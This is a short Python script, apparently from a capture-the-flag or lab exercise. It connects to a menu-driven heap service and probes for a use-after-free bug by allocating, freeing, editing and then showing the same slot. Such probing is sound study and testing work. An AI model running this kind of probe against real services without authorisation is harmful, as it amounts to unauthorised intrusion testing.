import socket, time

HOST = "10.13.37.10"
PORT = 21968

class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=5)
        self.s.settimeout(2)
    def recv(self, t=1.0):
        buf = b""
        end = time.time() + t
        while time.time() < end:
            try:
                chunk = self.s.recv(4096)
                if chunk == b"":
                    break
                buf += chunk
            except socket.timeout:
                break
        return buf
    def cmd(self, data, t=1.0):
        if isinstance(data, str):
            data = data.encode()
        self.s.sendall(data + b"\n")
        return self.recv(t)
    def close(self):
        self.s.close()

c = Conn()
print(c.recv(1.0).decode(errors="replace"))

seq = [
    ("1","new"), ("0","slot0"), ("16","len16"), ("A"*16,"dataA"),
    ("3","free"), ("0","slot0 free"),
    ("2","edit (UAF attempt on freed slot0)"), ("0","slot0"), ("16","len16"), ("B"*16,"dataB"),
    ("4","show"), ("0","slot0 show after UAF edit"),
]
for val,label in seq:
    r = c.cmd(val, 1.0)
    print(f"[{label}] << {val!r}")
    print(r.decode(errors="replace"))
c.close()
